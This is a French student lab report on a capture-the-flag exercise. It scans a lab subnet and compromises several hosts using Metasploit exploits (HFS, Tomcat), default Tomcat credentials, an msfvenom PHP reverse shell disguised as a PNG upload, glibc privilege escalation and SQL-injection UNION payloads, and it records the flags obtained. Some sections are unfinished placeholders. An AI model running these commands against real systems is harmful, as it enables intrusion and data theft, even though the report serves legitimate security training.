# AST - Labo 1 & 2

**Auteurs : ** Gwendoline Dössegger & Cassandre Wojciechowski

**Date : ** 07.10.2020

-----

#### Summary Host discovery & flags: 

- **10.10.40.1**         *routeur*
- **10.10.40.13**	   *flag : AST16{Ping_or_no_ping_thats_the_question}*
- **10.10.40.85**	   *flag : AST16{m3745p1017_p0w3r_700_345y}*
- **10.10.40.122**	*flag : AST16{d3f4u17_cr3d5_3v3rywh3r3}*
- **10.10.40.128**	*flag : AST16{up104d_w17h_57y13_15_n07_3n0u6h}*
- **10.10.40.138**	*flag : EHK17{1a86ff7923c40c9ccd806ee5036d363c068ccc4d}*
- **10.10.40.168**	*flag : not found yet*
- **10.10.40.231**	*flag : not found yet*

## Scanning 

Dans un premier temps, nous avons recherché les différents postes actifs présents dans l'infrastructure à l'aide de la commande suivante :

``````shell
nmap -sn 10.10.40.0/24
``````

Ceci nous a permis de trouver l'ensemble des machines suivante :

``````
10.10.40.1		//Routeur
10.10.40.13
10.10.40.85
10.10.40.122
10.10.40.128
10.10.40.138
10.10.40.168
10.10.40.231
``````

Le routeur 10.10.40.1 n'est pas pris en compte pour les exploitations. Quant aux autres postes et pour chacun d'entres-eux, nous avons scanné l'ensemble des ports avec les commandes suivantes (selon les besoins) :

``````shell
nmap -p0-65535 10.10.40.X -v		//le x correspond au poste
ou
nmap -sV --allport 10.10.40.x		
``````



## Exploitation

#### Host 10.10.40.13

Lors du scan de cette machine, nous avons pu constater qu'il y avait le port 80 ouvert et que le service http est activé dessus. On a donc essayé de se connecter avec un navigateur web. Sur la page web à l'adresse de la machine, on a pu y lire la version du serveur HTTP.

``````shell
afficher sortie nmap .......................................
``````

Le service correspond à un `HttpFileServer` en version `2.3`. Puis à l'aide de `searchsploit`, on a regardé les potentielles vulnérabilités pour ce service.

``````
//afficher les modules de searchsploit
..........................

``````

Nous avons utilisé la vulnérabilité suivante pour effectuer un exploit :

``````
nom .........................
``````

Choix de `exploit/windows/http/rejetto_hfs_exec` car ................................................................

Ensuite avec `msfconsole`, on a configuré et lancé l'exploit de la manière suivante :

``````shell
msfconsole
use exploit/windows/http/rejetto_hfs_exec		//choix du module
set rhost 10.10.40.13							//set l'adresse de la victime
show option 									//vérifier la configuration
exploit											//lancement de l'attaque
``````

Suite à l'exécution, on peut remarquer qu'on est sur la machine.

``````shell
sysinfo 										//vérifie sur quelle machine on est
getuid											//accès avec les privilèges Administrator
getsystem										//escalade de privilèges en système
ls												//affiche le contenu du répertoire
	
cat flag.txt									//affiche le contenu du fichier flag.txt
# AST16{Ping_or_no_ping_thats_the_question}
``````

> source : https://subscription.packtpub.com/book/networking_and_servers/9781786463166/1/ch01lvl1sec20/vulnerability-analysis-of-hfs-2-3



#### Host 10.10.40.85

``````shell
#Scan des ports avec 
nmap -p0-65535 10.10.40.85
......................................
``````

Suite au scan des ports, on a découvert que sur le port 1524 de la machine il y avait un service nommé `Metasploitable Root Shell`. Celui-ci est une ...... On s'y est donc connecté avec un `netcat`. 

``````shell
nc 10.10.40.85 1524
ls
# affichage des
#... fichiers (dont flag.txt)
#... dossiers

cat flag.txt
# AST16{m3745p1017_p0w3r_700_345y}*
``````

La connexion s'effectue sans problème et nous avons un `shell` fonctionnel sur la machine. Avec un `ls`, on a pu lister les fichiers et dossiers du répertoire courant. On a ensuite visualisé le fichier appelé `flag.txt` à l'aide de la commande suivante : `cat flag.txt`.

Le flag de cette machine est : `AST16{m3745p1017_p0w3r_700_345y}`



#### Host 10.10.40.122

````shell
#Scan des ports avec

sortie ............................................
````

Sur cette machine, on peut voir qu'il y a uniquement le port 8080 qui est ouvert avec un service web derrière. On s'est donc connecté via l'URL suivante : `http://10.10.40.122:8080` et nous avons obtenu la page web de base du serveur web `Tomcat`. On a parcouru les différents liens de la page et avons constaté qu'il fallait des identifiants pour se connecter au `manager webapp`.

Pour nous y connecter, nous avons décidé de tester les mots de passe par défaut à l'aide d'un module de `metasploit`. Ce module test l'ensemble des identifiants par défaut présents dans la base de données de `metasploit` sur le formulaire de connexion du manager de Tomcat. 

````shell
msfconsole
use scanner/http/tomcat_mgr_login					#pour tester les id par défaut
set RHOST 10.10.40.122								#ip de la victime
run

#Identifiant trouvé user:password
tomcat:tomcat
````

On a ensuite cherché une autre vulnérabilité afin d'avoir accès aux fichiers sur le serveur en passant par exemple par un `shell`.  Grâce à `metasploit`, il est donc possible de le faire. Nous avons donc configuré un `payload` suivant :

````shell
msfconsole
use exploit/multi/http/tomcat_mgr_deploy
set HttpPassword tomcat
set HttpUsername tomcat
set RHOST 10.10.40.122
set RPORT 8080
set VHOST 10.10.40.122
run	
````

Après avoir lancé l'exploit, un `shell meterpreter` s'est ouvert et on a donc pu naviguer dans le système de fichiers. Avec les commandes suivantes, on a pu retrouver le flag : 

````shell
#Recherche du fichiers & navigation dans les répertoires
ls
cd ../../
ls

#Affichage des fichiers/dossiers
cat flag.txt
````

Le flag de cette machine est : ` AST16{d3f4u17_cr3d5_3v3rywh3r3}`



#### Host 10.10.40.128

````shell
#Scan des ports avec 
nmap 
sortie ...............................................
````

.......................

```shell
#Générer un shell dans un fichier php
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.42.12 LPORT=5555 -f raw -o shell.php
```

Puis à l'aide d'un script python, on a ajouté les entêtes png au fichier `shell.php` afin que celui-ci puisse être upload sur le serveur.

La prochaine étape consiste configurer `metasploit` pour pouvoir accéder au `shell upload` sur le serveur. 

```shell
#configuration pour accéder au shell
use exploit/multi/handler 
set LHOST 10.10.42.12
set LPORT 5555
set PAYLOAD php/meterpreter/reverse_tcp 
exploit
```

Pour finaliser la connexion, il faut accéder à l'adresse du fichier php upload précédemment : http://10.10.40.128/uploads/4ff435f8ff59b14231f54cbe12bde851475b5bb4b156877e95ac4fb154849fb1_shell_modify.php

```shell
#mise en background de la session + regarder son ID
background
sessions 

#augmenter les privilèges
use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
set payload linux/x86/meterpreter_reverse_tcp
set LHOST 10.10.42.12
set LPORT 4500
set SESSION 3
exploit

#Vérifier qu'on est root
#Server username: uid=0, gid=0, euid=0, egid=0
getuid

#Avoir le flag
find / -name '*flag*'
```

Dans le dossier `/root`, on peut trouver le fichier `flag.txt`. Avec la commande `cat flag.txt`, on trouve le flag suivant : `AST16{up104d_w17h_57y13_15_n07_3n0u6h}`.



#### Host 10.10.40.138

````shell
#Scan des ports avec
nmap .............................................
````

Avec le scan de port, on trouve le service `ssh` qui tourne sur le port 22 ainsi qu'un service `http` sur le port 80. Nous nous sommes donc connectées avec un navigateur web à l'URL suivante : `http://10.10.40.138`. On peut voir qu'il y a un formulaire de connexion. Ceci implique qu'il y a une base de données derrière et une attaque d'injection SQL est potentiellement possible.

Dans un premier temps, nous avons saisie l'injection suivante dans le champ username et password : `'password' OR 1=1'`. Lors de la connexion, nous avons eu le message d'erreur suivant : 

````
"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'password' OR 1=1'" AND passw0rd='369e5c46184ae33e1e3701ef68bf11408653b8185575251' at line 1"
````

Puis lorsque l'on supprime le `cookie`, un message d'erreur indiquant que la valeur de `authenticator` n'est pas renseigné dans le `cookie`.

Nous avons donc recréé le `cookie` et l'avons modifié afin d'injecter nos requêtes SQL. Chaque requête SQL a été convertie en base64 avant l'envoi. 

``````mysql
#1. création d'un cookie
'password' OR 1=1' 

#2. affiche tous les users
admin' OR '' =':' OR '' = '  

#3. affiche les tables et leur nom
admin' UNION SELECT table_schema, table_name, 1 FROM information_schema.tables#: 

#4. Recherche les columns sur la table s3cr3t
admin' UNION SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name = 's3cr3t_t4ble'#:

#5. Affiche le contenu de la colone fl4g
admin' UNION SELECT fl4g, 1, 2 FROM s3cr3t_t4ble#:

#flag = EHK17{1a86ff7923c40c9ccd806ee5036d363c068ccc4d}
``````



#### Host 10.10.40.168

Dans un premier temps, on est redirigé vers l'adresse `http://www.corporation-sa.com` . On peut voir que le DNS ne peut résoudre l'adresse. Ceci insinue que l'adresse est sur un DNS interne. Il faut donc modifier le fichier `/etc/hosts`.

```shell
host www.corporation-sa.com 10.10.40.168
vim /etc/hosts

#ajouter
10.10.40.168 www.corporation-sa.com
```



nslookup

#### Host 10.10.40.231

Lors du scan des ports, on se retrouve avec la liste suivante :

``````shell
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 14:52 BST
Initiating Ping Scan at 14:52
Scanning 10.10.40.231 [4 ports]
Completed Ping Scan at 14:52, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:52
Completed Parallel DNS resolution of 1 host. at 14:52, 0.00s elapsed
Initiating SYN Stealth Scan at 14:52
Scanning 10.10.40.231 [65536 ports]
Discovered open port 22/tcp on 10.10.40.231
Discovered open port 60001/tcp on 10.10.40.231
Completed SYN Stealth Scan at 14:52, 18.02s elapsed (65536 total ports)
Nmap scan report for 10.10.40.231
Host is up (0.015s latency).
Not shown: 65533 closed ports
PORT      STATE    SERVICE
0/tcp     filtered unknown
22/tcp    open     ssh
60001/tcp open     unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.20 seconds
           Raw packets sent: 65718 (2.892MB) | Rcvd: 65537 (2.621MB)

``````

Nous avons essayé de nous connecter via `nc` sur le port 60001. Nous avons donc eu la sortie suivante :

``````shell
>nc 10.10.40.231 60001

In case of problem, creds to the server are guest:guest

What do you want to do ?
1. Create a new note
2. Change the content of one of your notes
3. Get infos about your notes
4. Delete one of your notes
5. Exit the progra, this will delete all your notes
``````

On obtient donc les informations sur la connexion ssh d'un utilisation : `guest:guest`. On peut donc s'y connecter de la manière suivante :

`ssh guest@10.10.40.231` et comme mdp `guest`.

Dans le répertoire `/home/ast20/note_service/share`, on retrouve le binaire `chall` qui est l'application qui tourne sur le port `60001`. 



------

##### Sources :

reverse shell : https://docs.j7k6.org/php-reverse-shell-metasploit/

augmenter les privilèges : https://www.youtube.com/watch?v=by-Z1EKwgTs